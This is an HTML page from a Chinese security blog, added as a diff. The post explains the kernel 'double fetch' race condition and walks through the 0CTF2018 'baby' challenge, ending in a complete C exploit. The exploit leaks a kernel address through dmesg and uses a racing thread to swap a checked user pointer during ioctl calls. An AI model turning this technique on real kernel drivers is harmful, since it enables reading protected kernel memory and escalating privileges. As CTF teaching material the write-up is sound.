@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Closure" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Double Fetch 
+      
+      
+      |
+    
+     Closure
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Closure</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Double Fetch</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-04-06 14:43:28
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Kernel/" title="Kernel">
+                    #Kernel
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h1><p>属于条件竞争漏洞（内核态与用户态之间的数据访问竞争）</p>
+<h3 id="漏洞介绍："><a href="#漏洞介绍：" class="headerlink" title="漏洞介绍："></a>漏洞介绍：</h3><p>虚拟内存地址通常被划分为内核空间和用户空间，内核空间负责运行内核代码，驱动模块代码，权限较高；</p>
+<p>用户空间运行用户代码，并通过系统调用进入内核完成相关功能&#x3D;&#x3D;》</p>
+<p>在用户空间向内核传递数据时，内核先通过copy_from_user等拷贝函数将用户数据拷贝至内核空间进行校验</p>
+<p>和相关处理&#x3D;&#x3D;》</p>
+<p>在输入的数据较为复杂时，内核可能只引用其指针，将其数据暂时保存在用户空间进行后续处理&#x3D;&#x3D;》</p>
+<p>该数据存在被恶意线程篡改的可能</p>
+<h3 id="漏洞原理模型："><a href="#漏洞原理模型：" class="headerlink" title="漏洞原理模型："></a>漏洞原理模型：</h3><p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/double-fetch.png"></p>
+<p>一个用户态线程准备数据并通过系统调用进入内核&#x3D;&#x3D;》</p>
+<p>该数据在内核中有两次被取用：</p>
+<p>第一次取用数据进行安全检查（缓冲区大小，指针可用性）</p>
+<p>检查通过后&#x3D;&#x3D;》内核第二次取用数据进行实际处理</p>
+<p>&#x3D;&#x3D;&#x3D;》在两次取用数据之间，另外一个用户态线程可创造条件竞争&#x3D;》</p>
+<p>对已通过检查的用户态数据进行篡改&#x3D;&#x3D;》</p>
+<p>在使用时造成访问越界或缓冲区溢出&#x3D;&#x3D;》内核崩溃&#x2F;权限提升</p>
+<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h3 id="0CTF2018-baby"><a href="#0CTF2018-baby" class="headerlink" title="0CTF2018-baby"></a>0CTF2018-baby</h3><p>提供</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220406101456476.png"></p>
+<p>对驱动进行检查：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220406101600498.png"></p>
+<p>静态分析：</p>
+<p>baby_ioctl():</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220406103822397.png"></p>
+<p>sub_25:</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220406103934408.png"></p>
+<p>&#x3D;&#x3D;》当参数为0x6666时，驱动将输出flag的加载地址</p>
+<p>&#x3D;&#x3D;》当参数为0x1337时，进行3个校验，接下来对用户输入的内容与硬编码的flag进行逐字节比较，一致时将flag输出</p>
+<p>校验函数：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220406104713718.png"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220406104615668.png"></p>
+<p>&#x3D;&#x3D;》__CFADD__将返回a1+a2的CF进位标志</p>
+<p>&#x3D;&#x3D;》当a1+a2小于a3时，条件满足（判断是否越界）</p>
+<p>&#x3D;&#x3D;》</p>
+<p>__readgsqword(&amp;current_task) + 0x1358为内核地址</p>
+<p>a3为用户的地址</p>
+<p>a3+8为flag的长度</p>
+<p>&#x3D;&#x3D;&#x3D;》</p>
+<p>a3为一个结构体</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">message</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span><span class="token comment">//存放用户层flag的地址</span>
+    <span class="token keyword">long</span> len<span class="token punctuation">;</span><span class="token comment">//len存放内核层flag的长度</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>检查内容：</p>
+<p>1、输入的数据指针是否为用户态数据</p>
+<p>2、数据指针内的flag_str是否指向用户态</p>
+<p>3、指针内的flag_len是否等于硬编码flag的长度</p>
+<p>思路：</p>
+<p>在绕过0x1337检查后，将buf的指针通过条件竞争的方式更改为内核flag的地址&#x3D;&#x3D;》</p>
+<p>在经过用户态flag与内核态flag长度判断时就是内核flag自己的判断，然后打印出flag的值</p>
+<p>1、寻找flag的长度</p>
+<p>2、得到flag的内核地址</p>
+<p>3、通过多线程实现buf指针的劫持，绕过检测</p>
+<p>4、通过dmesg查找内核打印至内核缓冲区的flag</p>
+<p>exp：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+
+<span class="token keyword">int</span> Time<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>
+<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> flag_addr<span class="token punctuation">;</span>       <span class="token comment">//真正的flag的位置</span>
+<span class="token keyword">int</span> finish<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span> <span class="token class-name">usr_data</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span> <span class="token operator">*</span>flag<span class="token punctuation">;</span>
+    <span class="token class-name">size_t</span> len<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">void</span> <span class="token function">evil_thread_func</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//传进来的参数是usr_data的地址</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Evil thread trugger!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">usr_data</span> <span class="token operator">*</span>s <span class="token operator">=</span> a<span class="token punctuation">;</span>
+    <span class="token keyword">while</span><span class="token punctuation">(</span>finish<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        s<span class="token operator">-></span>flag <span class="token operator">=</span> flag_addr<span class="token punctuation">;</span><span class="token comment">//修改用户态的结构体的flag地址为内核态flag地址</span>
+    <span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">201</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> usr_flag<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"flag&#123;aasdascxcdadwdaw&#125;"</span><span class="token punctuation">;</span>
+
+
+    <span class="token keyword">struct</span> <span class="token class-name">usr_data</span> usr_data<span class="token punctuation">;</span>
+    usr_data<span class="token punctuation">.</span>flag <span class="token operator">=</span> usr_flag<span class="token punctuation">;</span>
+    usr_data<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">33</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>
+    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/baby"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开对应的设备</span>
+
+    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
+    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//发送0x6666，经过第一个if</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"dmesg | grep flag > /tmp/sir.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//通过dmesg获取printk出来的内核态flag地址</span>
+
+
+    <span class="token keyword">int</span> file_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/sir.txt"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> id <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>file_fd<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">close</span><span class="token punctuation">(</span>file_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">char</span> <span class="token operator">*</span>addr<span class="token punctuation">;</span>
+    addr <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"Your flag is at "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//此时addr指向Your</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    addr <span class="token operator">+=</span> <span class="token number">0x10</span><span class="token punctuation">;</span><span class="token comment">//此时addr指向flag</span>
+
+    flag_addr <span class="token operator">=</span> <span class="token function">strtoull</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>addr<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//16进制字符串转unsigned longlong，全局变量flag_addr中此时是真正的flag的地址</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]flag addr is : %p\n"</span><span class="token punctuation">,</span>flag_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token class-name">pthread_t</span> evil_thread<span class="token punctuation">;</span><span class="token comment">//设置线程对象指针</span>
+    <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>evil_thread<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span>evil_thread_func<span class="token punctuation">,</span><span class="token operator">&amp;</span>usr_data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//开一个恶意线程来修改usr data,不断的将user_flag所指向的用户态地址修改为flag的内核地址以制造竞争条件</span>
+    <span class="token comment">//从而使其通过驱动中的逐字节比较检查,输出flag内容</span>
+    <span class="token comment">//Time=1000</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>Time<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x1337</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>usr_data<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//不断地去发0x1337进入第二个if</span>
+        usr_data<span class="token punctuation">.</span>flag<span class="token operator">=</span>usr_flag<span class="token punctuation">;</span>                 <span class="token comment">//保证usr.flag指向用户态的空间</span>
+    <span class="token punctuation">&#125;</span>
+    finish<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>              
+    <span class="token function">pthread_join</span><span class="token punctuation">(</span>evil_thread<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//结束线程</span>
+    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The flag in Kernel is :\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"dmesg | grep flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220406213750519.png"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/04/02/Kernel-ROP-USR/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-04-06 14:43:28
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Kernel/" title="Kernel">
+                        #Kernel
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/04/09/userfaultfd/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Double-Fetch"><span class="toc-text">Double Fetch</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%EF%BC%9A"><span class="toc-text">漏洞介绍：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%A8%A1%E5%9E%8B%EF%BC%9A"><span class="toc-text">漏洞原理模型：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A"><span class="toc-text">例题：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0CTF2018-baby"><span class="toc-text">0CTF2018-baby</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2023 Closure</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Double%20Fetch + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F04%2F06%2FDouble-Fetch%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/04/06/Double-Fetch/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
